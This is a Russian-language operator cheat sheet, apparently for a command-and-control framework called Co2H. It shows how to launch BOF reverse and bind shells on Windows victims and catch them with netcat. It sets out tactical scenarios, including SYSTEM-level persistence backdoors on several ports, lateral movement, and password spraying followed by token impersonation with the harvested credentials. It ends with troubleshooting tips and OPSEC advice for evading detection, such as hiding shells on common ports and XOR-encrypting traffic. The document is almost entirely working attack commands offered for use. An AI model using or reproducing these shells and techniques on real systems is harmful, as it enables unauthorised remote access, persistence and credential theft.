Co2H Shell Examples — reverse и bind shell через BOF для работы с netcat.

================================================================================
REVERSE SHELL BOF — жертва подключается к атакующему
================================================================================

# 1. Настроить listener на атакующей машине
nc -lvp 4444

# 2. Запустить reverse shell на жертве
bof stand\build\bof_reverse_shell.x64.o 192.168.1.100 4444

# 3. Получить shell в netcat
# C:\> whoami
# victim\user
# C:\> ipconfig
# C:\> dir

================================================================================
BIND SHELL BOF — атакующий подключается к жертве
================================================================================

# 1. Запустить bind shell на жертве
bof stand\build\bof_bind_shell.x64.o 4444

# 2. Подключиться с атакующей машины
nc 192.168.1.50 4444

# 3. Получить интерактивный shell
# C:\> net user
# C:\> systeminfo

================================================================================
ТАКТИЧЕСКИЕ СЦЕНАРИИ
================================================================================

# Scenario 1: Persistence backdoor
steal_token <system_pid>                           # Получить SYSTEM права
bof stand\build\bof_bind_shell.x64.o 8080          # Bind на порт HTTP
# Теперь можно подключаться: nc target_ip 8080 → SYSTEM shell

# Scenario 2: Lateral movement через reverse shell
# На изолированной машине без прямого доступа к атакующему:
bof stand\build\bof_reverse_shell.x64.o 10.0.0.5 443  # Через beacon channel
# Shell приходит на 10.0.0.5:443 (внутренний маршрут)

# Scenario 3: Multiple shells для redundancy
bof stand\build\bof_bind_shell.x64.o 4444          # Первый backdoor
bof stand\build\bof_bind_shell.x64.o 8080          # Второй на HTTP порту
bof stand\build\bof_bind_shell.x64.o 3389          # Третий на RDP порту

# Scenario 4: Credential harvesting + shell
bof stand\build\bof_password_spray.x64.o           # Найти слабые пароли
# Найден admin:Password123
make_token .\admin Password123
bof stand\build\bof_bind_shell.x64.o 4445          # Shell под admin

================================================================================
NETCAT ОПЕРАЦИОННЫЕ ТЕХНИКИ
================================================================================

# Атакующая машина (reverse shell):
nc -lvp 4444 -s 0.0.0.0 | tee reverse_session.log    # Логирование
while true; do nc -lvp 4444; sleep 5; done            # Автоматическое переподключение

# Подключение к bind shell:
timeout 30 nc -nv 192.168.1.50 4444                   # С таймаутом
nc 192.168.1.50 4444 < commands.txt > output.txt      # Batch команды

# Проверка доступности bind shell:
echo "echo test" | nc -w 3 192.168.1.50 4444          # Быстрая проверка

================================================================================
ПРЕИМУЩЕСТВА BOF SHELLS над shellcode
================================================================================

# Плюсы BOF approach:
+ Динамические параметры (IP/port через аргументы)
+ Лучший error handling и логирование
+ Не нужно пересобирать для разных IP/портов
+ Работает в любом процессе с ws2_32.dll
+ Полный контроль над WinSock API

# Vs. shellcode:
- Shellcode: статический IP/port, нужна пересборка
- BOF: параметры передаются во время выполнения

================================================================================
TROUBLESHOOTING
================================================================================

# BOF не подключается:
1. Проверить что ws2_32.dll загружена в процесс
   bof stand\build\bof_hello.x64.o    # Тест BOF loader
2. Проверить сетевую связность
3. Убедиться что порт не заблокирован firewall

# Bind shell недоступен:
1. Проверить что BOF отработал без ошибок
2. Проверить netstat: netstat -an | findstr :4444
3. Тестировать локально: nc 127.0.0.1 4444

# Process crashes после shell:
1. Использовать spawnto вместо inject в критичные процессы
2. Проверить что CreateProcess succeeded в BOF output

================================================================================
OPSEC РЕКОМЕНДАЦИИ
================================================================================

# Хорошие практики:
1. Использовать легитимные порты (80, 443, 8080, 3389)
2. Запускать bind shell только при необходимости
3. Закрывать shells после использования
4. Мониторить netstat на предмет открытых портов

# Избегать:
- Дефолтный порт 4444 (слишком подозрительный)
- Длительные bind shells (оставляют следы)
- Множественные одновременные shells

# Улучшения:
- Добавить basic authentication к bind shell
- Использовать XOR encryption для трафика
- Ограничить время жизни shell (auto-timeout)
